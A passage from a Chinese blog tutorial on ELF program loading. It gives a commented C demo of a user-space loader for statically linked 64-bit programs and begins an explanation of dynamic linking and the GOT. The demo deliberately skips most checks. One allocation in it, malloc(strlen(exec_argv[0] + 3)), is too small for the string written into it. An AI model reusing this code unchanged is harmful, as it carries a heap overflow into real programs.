class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;elf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KB * (1024ll)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MB * (1024ll KB)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 传入的环境变量数组</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 载入64位的静态链接程序exec，其参数个数为argc，其参数指针数组为argv，环境变量数组为environ */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">static_load_elf</span><span class="params">(<span class="type">char</span> *exec, <span class="type">int</span> exec_argc, <span class="type">char</span> *exec_argv[], <span class="type">char</span> **exec_environ)</span>; <span class="comment">/* 载入64位的静态链接程序exec的各个segment */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">static_load_segments</span><span class="params">(<span class="type">int</span> exec_fd, Elf64_Ehdr *elf64_ehdr)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 根据System V api文档</span></span><br><span class="line"><span class="comment"> * 初始化程序的堆栈结构，即设置argc，argv和envp即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">static_init_stack</span><span class="params">(<span class="type">int</span> exec_argc, <span class="type">char</span> *exec_argv[], <span class="type">char</span> **exec_environ)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 根据System V api文档</span></span><br><span class="line"><span class="comment"> * 初始化相关的寄存器，自然包括控制流的跳转</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">static_init_registers</span><span class="params">(Elf64_Ehdr *elf64_ehdr, <span class="type">void</span> *<span class="built_in">stack</span>)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 载入64位的静态链接程序exec，其参数个数为argc，其参数指针数组为argv，环境变量数组为environ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">static_load_elf</span><span class="params">(<span class="type">char</span> *exec, <span class="type">int</span> exec_argc, <span class="type">char</span> *exec_argv[], <span class="type">char</span> **exec_environ)</span> &#123;</span><br><span class="line"><span class="comment">//以只读模式打开exec文件</span></span><br><span class="line"><span class="type">int</span> exec_fd = open(exec, O_RDONLY);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(exec_fd &lt; <span class="number">0</span>) &#123; <span class="built_in">exit</span>(EXIT_FAILURE); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 由于这里只展示原理性的东西</span></span><br><span class="line"><span class="comment"> * 因此不会进行特别多的检查</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//载入静态链接的起始部分(头部、Program Header)，默认4KB以内</span></span><br><span class="line">Elf64_Ehdr *elf64_ehdr = (Elf64_Ehdr*)mmap(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//addr，即映射的虚拟地址</span></span><br><span class="line"><span class="number">4</span> KB, <span class="comment">//length，映射的字节长度</span></span><br><span class="line">PROT_READ,<span class="comment">//prot，映射内存的属性</span></span><br><span class="line">MAP_SHARED,<span class="comment">//flags，映射内存的标志</span></span><br><span class="line">exec_fd,<span class="comment">//fd，映射内存的文件描述符</span></span><br><span class="line"><span class="number">0</span><span class="comment">//offset，文件描述符的起始偏移</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(elf64_ehdr == MAP_FAILED) &#123; <span class="built_in">exit</span>(EXIT_FAILURE); &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;elf64_ehdr address =&gt; %p\n&quot;</span>, elf64_ehdr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;elf64_ehdr-&gt;e_phentsize =&gt; %d\n&quot;</span>, elf64_ehdr-&gt;e_phentsize);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;elf64_ehdr-&gt;e_phnum =&gt; %d\n&quot;</span>, elf64_ehdr-&gt;e_phnum);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;elf64_ehdr-&gt;e_phoff =&gt; %ld\n&quot;</span>, elf64_ehdr-&gt;e_phoff);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 载入64位的静态链接程序exec的各个segment即可</span></span><br><span class="line">static_load_segments(exec_fd, elf64_ehdr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化堆栈结构，即设置argc，argv和envp即可</span></span><br><span class="line"><span class="type">void</span> *<span class="built_in">stack</span> = static_init_stack(exec_argc, exec_argv, exec_environ);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 完成寄存器初始化并进行跳转</span></span><br><span class="line">static_init_registers(elf64_ehdr, <span class="built_in">stack</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 载入64位的静态链接程序exec的各个segment</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">static_load_segments</span><span class="params">(<span class="type">int</span> exec_fd, Elf64_Ehdr *elf64_ehdr)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//首先读取segments描述符数组，即Program header数组</span></span><br><span class="line">Elf64_Phdr *elf64_phdrs = (Elf64_Phdr*)(((<span class="type">uintptr_t</span>)(elf64_ehdr)) + elf64_ehdr-&gt;e_phoff);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;elf64_phdrs address =&gt; %p\n&quot;</span>, elf64_phdrs);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;prot: PROT_READ =&gt; %#x PROT_WRITE =&gt; %#x PROT_EXEC =&gt; %#x\n&quot;</span>, PROT_READ, PROT_WRITE, PROT_EXEC);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Elf64_Phdr-&gt;p_flags: PF_R =&gt; %#x PF_W =&gt; %#x PF_X =&gt; %#x\n&quot;</span>, PF_R, PF_W, PF_X);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//依次遍历segments，将其载入内存</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; elf64_ehdr-&gt;e_phnum; ++i) &#123;</span><br><span class="line">Elf64_Phdr *elf64_phdr = &amp;elf64_phdrs[i];</span><br><span class="line"><span class="comment">//如果对应的p_type字段是PT_LOAD，则直接将其载入至内存中即可</span></span><br><span class="line"><span class="keyword">if</span>(elf64_phdr-&gt;p_type == PT_LOAD) &#123;</span><br><span class="line"><span class="type">uint64_t</span> prot = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据elf64_phdr-&gt;p_flags来判断映射权限</span></span><br><span class="line"><span class="keyword">if</span>(elf64_phdr-&gt;p_flags &amp; PF_R) &#123; prot |= PROT_READ; &#125;</span><br><span class="line"><span class="keyword">if</span>(elf64_phdr-&gt;p_flags &amp; PF_W) &#123; prot |= PROT_WRITE; &#125;</span><br><span class="line"><span class="keyword">if</span>(elf64_phdr-&gt;p_flags &amp; PF_X) &#123; prot |= PROT_EXEC; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * segments的大小和虚拟地址根据p_align字段进行对齐即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> *elf64_phdr_vaddr_align = (<span class="type">void</span>*)((<span class="type">uintptr_t</span>)elf64_phdr-&gt;p_vaddr &amp; (~((<span class="type">uintptr_t</span>)elf64_phdr-&gt;p_align - <span class="number">1</span>)));</span><br><span class="line"><span class="type">size_t</span> elf64_phdr_length_align = elf64_phdr-&gt;p_memsz + ((<span class="type">uintptr_t</span>)elf64_phdr-&gt;p_vaddr - (<span class="type">uintptr_t</span>)elf64_phdr_vaddr_align);</span><br><span class="line"><span class="type">off_t</span> elf64_phdr_offset_align = elf64_phdr-&gt;p_offset &amp; (~((<span class="type">uintptr_t</span>)elf64_phdr-&gt;p_align - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;elf64_phdrs[%d] elf64_phdr_vaddr_align =&gt; %p, elf64_phdr_length_align =&gt; %#lx, elf64_phdr_offset_align =&gt; %#lx prots =&gt; %#lx\n&quot;</span>, i, elf64_phdr_vaddr_align, elf64_phdr_length_align, elf64_phdr_offset_align, prot);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">void</span> *address = mmap(</span><br><span class="line">elf64_phdr_vaddr_align,<span class="comment">//addr，即映射的虚拟地址</span></span><br><span class="line">elf64_phdr_length_align, <span class="comment">//length，映射的字节长度</span></span><br><span class="line">prot,<span class="comment">//prot，映射内存的属性</span></span><br><span class="line">MAP_PRIVATE | MAP_FIXED,<span class="comment">//flags，映射内存的标志</span></span><br><span class="line">exec_fd,<span class="comment">//fd，映射内存的文件描述符</span></span><br><span class="line">elf64_phdr_offset_align<span class="comment">//offset，文件描述符的起始偏移</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//由于可能存在bss段等，因此需要将多余的空间置为0，否则执行会错误</span></span><br><span class="line"><span class="built_in">memset</span>(((<span class="type">char</span>*)elf64_phdr-&gt;p_vaddr) + elf64_phdr-&gt;p_filesz, <span class="number">0</span>, elf64_phdr-&gt;p_memsz - elf64_phdr-&gt;p_filesz);</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试，用来输出载入的segment的相关地址信息</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;elf64_phdrs[%d] address =&gt; %p p_vaddr =&gt; %#lx; p_memsz =&gt; %#lx; p_flags =&gt; %#x p_filesz =&gt; %#lx p_align =&gt; %#lx\n\n&quot;</span>, i, address, elf64_phdr-&gt;p_vaddr, elf64_phdr-&gt;p_memsz, elf64_phdr-&gt;p_flags, elf64_phdr-&gt;p_filesz, elf64_phdr-&gt;p_align);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 根据System V api文档</span></span><br><span class="line"><span class="comment"> * 初始化程序的堆栈结构，即设置argc，argv和envp即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">static_init_stack</span><span class="params">(<span class="type">int</span> exec_argc, <span class="type">char</span> *exec_argv[], <span class="type">char</span> **exec_environ)</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 申请堆栈所需要的地址</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> *<span class="built_in">stack</span> = mmap(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//addr，即映射的虚拟地址</span></span><br><span class="line"><span class="number">1</span> MB, <span class="comment">//length，映射的字节长度</span></span><br><span class="line">PROT_READ | PROT_WRITE,<span class="comment">//prot，映射内存的属性</span></span><br><span class="line">MAP_PRIVATE | MAP_ANONYMOUS,<span class="comment">//flags，映射内存的标志</span></span><br><span class="line"><span class="number">-1</span>,<span class="comment">//fd，映射内存的文件描述符</span></span><br><span class="line"><span class="number">0</span><span class="comment">//offset，文件描述符的起始偏移</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里栈空间的起始位置</span></span><br><span class="line"><span class="type">uintptr_t</span> *sp = (<span class="type">uintptr_t</span>*)((<span class="type">uintptr_t</span>)(<span class="built_in">stack</span>) + <span class="number">1</span> MB - <span class="number">4</span> KB);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里设置当前栈帧的顶部</span></span><br><span class="line"><span class="type">void</span> *res = (<span class="type">void</span>*)sp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//压入exec_argc</span></span><br><span class="line">*sp++ = exec_argc;</span><br><span class="line"></span><br><span class="line"><span class="comment">//压入exec_argv</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; exec_argv[i]; ++i) &#123;*sp++ = (<span class="type">uintptr_t</span>)exec_argv[i];&#125;</span><br><span class="line"><span class="comment">//压入exec_argv结束的0</span></span><br><span class="line">*sp++ = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//压入exec_environ</span></span><br><span class="line"><span class="type">int</span> environ_idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(; exec_environ[environ_idx]; ++environ_idx) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strchr</span>(exec_environ[environ_idx], <span class="string">&#x27;_&#x27;</span>) != exec_environ[environ_idx]) &#123; *sp++ = (<span class="type">uintptr_t</span>)exec_environ[environ_idx]; &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">char</span> *environ = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(exec_argv[<span class="number">0</span>] + <span class="number">3</span>));</span><br><span class="line"><span class="built_in">sprintf</span>(environ, <span class="string">&quot;_=%s&quot;</span>, exec_argv[<span class="number">0</span>]);</span><br><span class="line">*sp++ = (<span class="type">uintptr_t</span>)environ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//压入exec_environ结束的0</span></span><br><span class="line">*sp++ = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//压入auxiliary vector entries，这些是内核提供给用户空间的一些设置参数，否则glibc无法正常运行。不能直接复制加载器的，否则待加载程序会崩溃</span></span><br><span class="line"><span class="comment">//for(Elf64_auxv_t *elf64_auxv_t = (Elf64_auxv_t*)&amp;exec_environ[environ_idx + 1]; elf64_auxv_t-&gt;a_type != AT_NULL; ++elf64_auxv_t) &#123;</span></span><br><span class="line"><span class="comment">//*((Elf64_auxv_t*)sp) = *elf64_auxv_t;</span></span><br><span class="line"><span class="comment">//sp = (uintptr_t*)((Elf64_auxv_t*)sp + 1);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line">*((Elf64_auxv_t*)sp) = (Elf64_auxv_t)&#123; .a_type = AT_RANDOM, .a_un.a_val = (<span class="type">uintptr_t</span>)(<span class="built_in">stack</span>) + <span class="number">1</span> MB - <span class="number">16</span>&#125;;</span><br><span class="line">sp = (<span class="type">uintptr_t</span>*)((Elf64_auxv_t*)sp + <span class="number">1</span>);</span><br><span class="line">*((Elf64_auxv_t*)sp) = (Elf64_auxv_t)&#123; .a_type = AT_NULL&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;stack =&gt; %p\n&quot;</span>, res);</span><br><span class="line"><span class="type">int</span> argc = *(<span class="type">int</span>*)res, i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;argc =&gt; %d\n&quot;</span>, argc);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> **argv = ((<span class="type">char</span>**)res) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; argc; ++i) &#123; <span class="built_in">printf</span>(<span class="string">&quot;argv[%d] = %s\n&quot;</span>, i, argv[i]); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> **environ = argv + argc + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; environ[i]; ++i) &#123; <span class="built_in">printf</span>(<span class="string">&quot;environ[%d] = %s\n&quot;</span>, i, environ[i]); &#125;</span><br><span class="line"></span><br><span class="line">Elf64_auxv_t *<span class="type">elf64_auxv_t</span> = (Elf64_auxv_t*)(environ + i + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; <span class="type">elf64_auxv_t</span>[i].a_type != AT_NULL; ++i) &#123; <span class="built_in">printf</span>(<span class="string">&quot;auxiliary[%d].a_type = %#lx, auxiliary[%d].a_un.a_val = %#lx\n&quot;</span>, i, <span class="type">elf64_auxv_t</span>[i].a_type, i, <span class="type">elf64_auxv_t</span>[i].a_un.a_val); &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 根据System V api文档</span></span><br><span class="line"><span class="comment"> * 初始化相关的寄存器，自然包括控制流的跳转</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">static_init_registers</span><span class="params">(Elf64_Ehdr *elf64_ehdr, <span class="type">void</span> *<span class="built_in">stack</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过内联汇编，初始化寄存器，并完成跳转</span></span><br><span class="line">__asm__ <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params"><span class="string">&quot;mov %0, %%rsp;&quot;</span><span class="comment">//将rsp设置为之前初始化的栈的位置</span></span></span><br><span class="line"><span class="params"><span class="string">&quot;xor %%rdx, %%rdx;&quot;</span><span class="comment">//将rdx设置为atexit部分</span></span></span><br><span class="line"><span class="params"><span class="string">&quot;jmp *%1&quot;</span><span class="comment">//将待跳转的目标地址存到寄存器中，然后间接跳转</span></span></span><br><span class="line"><span class="params">:</span></span><br><span class="line"><span class="params">: <span class="string">&quot;r&quot;</span>(<span class="built_in">stack</span>), <span class="string">&quot;r&quot;</span>(elf64_ehdr-&gt;e_entry)</span></span><br><span class="line"><span class="params">: <span class="string">&quot;rdx&quot;</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(argc == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: static-loader file [args...]\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * argv[0] = &quot;./static-loader&quot;</span></span><br><span class="line"><span class="comment"> * argv[1] = 待载入程序路径</span></span><br><span class="line"><span class="comment"> * argv[2 : argc] = 待载入程序参数</span></span><br><span class="line"><span class="comment"> * argv[argc] = 0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">static_load_elf(argv[<span class="number">1</span>], argc - <span class="number">1</span>, argv + <span class="number">1</span>, environ);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//理论上，完成跳转后，程序通过hlt退出，永远不会执行到该处</span></span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码的注释已经非常详细了，下面直接给出<a href="static_loader.tar.gz">静态链接程序的加载器demo</a></p></li></ol><h3 id="动态链接程序的加载"><a href="#动态链接程序的加载" class="headerlink" title="动态链接程序的加载"></a>动态链接程序的加载</h3><p>  当前标准下的动态链接程序加载十分繁琐，但是其整体原理还是较为简单的。因此这里保留动态链接程序加载的主要原理，实现一个<strong>自定义</strong>的动态链接的标准，并实现一个基于该<strong>自定义</strong>标准的动态链接程序的加载器，从而帮助理解动态链接程序的加载过程及其原理</p><h4 id="为什么需要动态链接"><a href="#为什么需要动态链接" class="headerlink" title="为什么需要动态链接"></a>为什么需要动态链接</h4><p>  程序之间往往会包含一部分重复的代码(极端情况就是一个shell程序可能运行多份)。如果程序都采取静态链接，则作为进程加载的时候，需要将整个程序二进制文件都载入到内存中，这是十分浪费的。<br>  因此，我们希望采用某种技术(实际上就是动态链接)，从而将程序可能重复的部分仅仅加载一次</p><h4 id="为什么静态链接不行"><a href="#为什么静态链接不行" class="headerlink" title="为什么静态链接不行"></a>为什么静态链接不行</h4><p>  简单来说，是由于程序的编译链接和程序的载入不是同时进行的</p><p>  静态链接要求在编译链接时一次性生成程序运行所需要的所有数据，但是其必定无法确定在将来被载入时的重复代码部分的内存地址<br>  而动态链接在编译时仅仅按照相关标准生成重复代码调用的相关标记，则可以正常完成编译；在载入时再通过编译留下的标记信息和系统调用，载入重复代码或获取已经被载入的重复代码的内存地址，从而正确执行。</p><h4 id="如何实现动态链接"><a href="#如何实现动态链接" class="headerlink" title="如何实现动态链接"></a>如何实现动态链接</h4><p>  实际上，根据前面的分析，我们知道。采用动态链接的程序，其在载入的时候，会动态的载入重复部分的代码，并执行这部分代码。这部分代码就是动态加载库。</p><ol><li><p>动态加载库的代码格式<br>因此，实际上要实现动态链接，起码需要产生可以不依赖加载地址进行执行的代码形式，从而将其作为动态加载库的代码格式。而这就是位置无关代码格式，其访问变量或代码时，都通过相对<strong>rip</strong>寄存器的偏移进行访问，从而避免了对于载入地址的依赖性。</p></li><li><p>程序的编译<br>根据前面的分析，采用动态链接载入的程序，在编译的时候需要按照相关标准生成动态链接库的调用标记。最简单的方式，就是将所有待解析的符号地址及其特征(如符号名)存储在一个数组中。这样，当编译的时候，只需要生成该数组即可,然后调用的地址为该数组中的待解析符号地址即可。这个数组即<strong>GOT</strong>(Global Offset Table)<br>而为了方便最终的符号解析，动态链接库中应该包含一个动态链接库的符号导出表，其包含符号在当前动态链接库的相对偏移以及符号的特征。<br>载入程序时，根据依赖顺序首先载入所有的动态链接库，然后根据载入符号表中的导出表，从而根据其符号特征重新解析导入表中符号对应的地址即可。</p></li></ol><h4 id="动态链接实现细节"><a href="#动态链接实现细节" class="headerlink" title="动态链接实现细节"></a>动态链接实现细节</h4><p>  